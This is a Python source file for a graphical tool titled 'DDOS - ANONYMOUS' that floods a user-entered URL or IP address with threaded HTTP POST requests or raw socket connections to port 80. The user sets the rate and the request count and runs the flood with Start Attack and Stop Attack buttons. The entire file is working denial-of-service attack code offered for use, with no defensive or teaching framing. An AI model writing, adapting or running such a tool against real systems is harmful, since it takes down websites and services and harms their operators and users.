import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import requests
import socket
import threading
import time

class AttackTool:
    def __init__(self, root_window):
        self.root_window = root_window
        self.root_window.title("DDOS - ANONYMOUS")
        self.root_window.geometry("800x700")
        self.root_window.configure(bg="black")
        self._setup_styles()

        self.attack_mode = tk.StringVar(value="http_requests")
        self.request_speed = tk.IntVar(value=1)
        self.use_ip_address = tk.BooleanVar(value=False)
        self.url_input = tk.StringVar()
        self.ip_address_input = tk.StringVar()
        self.total_requests = tk.IntVar(value=1)
        self.stop_attack_flag = threading.Event()

        self._create_ui()

    def _setup_styles(self):
        self.root_window.option_add("*TButton*background", "#0033cc")
        self.root_window.option_add("*TEntry*borderWidth", 1)
        self.root_window.option_add("*TEntry*relief", "solid")
        self.root_window.option_add("*TEntry*highlightBackground", "red")
        self.root_window.option_add("*TEntry*highlightThickness", 1)
        self.root_window.option_add("*TLabel*foreground", "#ffffff")
        self.root_window.option_add("*TButton*foreground", "#ffffff")
        self.root_window.option_add("*TButton*borderWidth", 1)
        self.root_window.option_add("*TButton*relief", "solid")
        self.root_window.option_add("*TButton*highlightBackground", "red")
        self.root_window.option_add("*TButton*highlightThickness", 1)

    def _create_ui(self):
        self.image = Image.open("ddos.png")
        self.image = ImageTk.PhotoImage(self.image)
        self.image_label = ttk.Label(self.root_window, image=self.image, background="black")
        self.image_label.pack(pady=(10, 10))

        self.main_frame = ttk.Frame(self.root_window, padding=15, style='TFrame')
        self.main_frame.place(relx=0.5, rely=0.7, anchor='center')

        ttk.Label(self.main_frame, text="Target URL:").grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        self.url_entry = ttk.Entry(self.main_frame, textvariable=self.url_input)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        self.ip_checkbox = ttk.Checkbutton(self.main_frame, text="Use IP Address", variable=self.use_ip_address, command=self._toggle_ip_entry)
        self.ip_checkbox.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        
        self.ip_entry = ttk.Entry(self.main_frame, textvariable=self.ip_address_input, state="disabled")
        self.ip_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")

        ttk.Label(self.main_frame, text="Attack Mode:").grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        ttk.Radiobutton(self.main_frame, text="HTTP Requests", variable=self.attack_mode, value="http_requests").grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        ttk.Radiobutton(self.main_frame, text="Socket Connections", variable=self.attack_mode, value="socket_connections").grid(row=2, column=2, padx=5, pady=5, sticky="ew")

        ttk.Label(self.main_frame, text="Request Speed (requests/sec):").grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        self.speed_slider = ttk.Scale(self.main_frame, from_=1, to=100, variable=self.request_speed)
        self.speed_slider.grid(row=3, column=1, padx=5, pady=5, sticky="ew")

        ttk.Label(self.main_frame, text="Number of Requests:").grid(row=4, column=0, padx=5, pady=5, sticky="ew")
        self.request_count_entry = ttk.Entry(self.main_frame, textvariable=self.total_requests)
        self.request_count_entry.grid(row=4, column=1, padx=5, pady=5, sticky="ew")

        self.output_text = tk.Text(self.main_frame, height=8, width=40, bg="black", fg="white", bd=1, relief="solid", highlightbackground="red", highlightthickness=1)
        self.output_text.grid(row=5, column=0, columnspan=3, padx=5, pady=5, sticky="ew")

        self.start_button = ttk.Button(self.main_frame, text="Start Attack", command=self._start_attack)
        self.start_button.grid(row=6, column=0, padx=5, pady=5, sticky="ew")

        self.stop_button = ttk.Button(self.main_frame, text="Stop Attack", command=self._stop_attack)
        self.stop_button.grid(row=6, column=1, padx=5, pady=5, sticky="ew")

        self.clear_button = ttk.Button(self.main_frame, text="Clear Output", command=self._clear_output)
        self.clear_button.grid(row=7, column=0, columnspan=3, padx=5, pady=5, sticky="ew")

    def _toggle_ip_entry(self):
        if self.use_ip_address.get():
            self.ip_entry.config(state="normal")
            self.url_entry.config(state="disabled")
        else:
            self.ip_entry.config(state="disabled")
            self.url_entry.config(state="normal")

    def _start_attack(self):
        self.stop_attack_flag.clear()
        target = self.ip_address_input.get() if self.use_ip_address.get() else self.url_input.get()
        attack_type = self.attack_mode.get()
        speed = self.request_speed.get()
        num_requests = self.total_requests.get()

        if attack_type == "http_requests":
            threading.Thread(target=self._perform_http_requests, args=(target, speed, num_requests), daemon=True).start()
        elif attack_type == "socket_connections":
            threading.Thread(target=self._perform_socket_connections, args=(target, speed, num_requests), daemon=True).start()

    def _perform_http_requests(self, target, speed, num_requests):
        self.output_text.insert(tk.END, f"Initiating HTTP requests to {target} with {num_requests} requests\n")
        threads = []
        for request_number in range(1, num_requests + 1):
            if self.stop_attack_flag.is_set():
                self.output_text.insert(tk.END, "Attack stopped\n")
                break
            thread = threading.Thread(target=self._send_http_request, args=(target, request_number))
            threads.append(thread)
            thread.start()
            time.sleep(1 / max(1, speed))

        for t in threads:
            t.join()

        if not self.stop_attack_flag.is_set():
            self.output_text.insert(tk.END, "All HTTP requests have been completed\n")

    def _send_http_request(self, target, request_number):
        try:
            if not target.startswith("http://") and not target.startswith("https://"):
                target = "http://" + target
            response = requests.post(target)
            self.output_text.insert(tk.END, f"Request {request_number} sent: {response.status_code}\n")
        except Exception as e:
            self.output_text.insert(tk.END, f"Error in request {request_number}: {e}\n")
        self.output_text.see(tk.END)

    def _perform_socket_connections(self, target, speed, num_requests):
        self.output_text.insert(tk.END, f"Initiating socket connections to {target} with {num_requests} requests\n")
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror:
            self.output_text.insert(tk.END, f"Error: Could not resolve {target} to an IP address\n")
            return

        threads = []
        for request_number in range(1, num_requests + 1):
            if self.stop_attack_flag.is_set():
                self.output_text.insert(tk.END, "Attack stopped\n")
                break
            thread = threading.Thread(target=self._send_socket_request, args=(ip, 80, request_number))
            threads.append(thread)
            thread.start()
            time.sleep(1 / max(1, speed))

        for t in threads:
            t.join()

        if not self.stop_attack_flag.is_set():
            self.output_text.insert(tk.END, "All socket connections have been completed\n")

    def _send_socket_request(self, ip, port, request_number):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(b"POST / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            self.output_text.insert(tk.END, f"Socket request {request_number} sent\n")
            s.close()
        except Exception as e:
            self.output_text.insert(tk.END, f"Error in socket request {request_number}: {e}\n")
        self.output_text.see(tk.END)

    def _stop_attack(self):
        self.stop_attack_flag.set()

    def _clear_output(self):
        self.output_text.delete(1.0, tk.END)

if __name__ == "__main__":
    main_window = tk.Tk()
    tool = AttackTool(main_window)
    main_window.mainloop()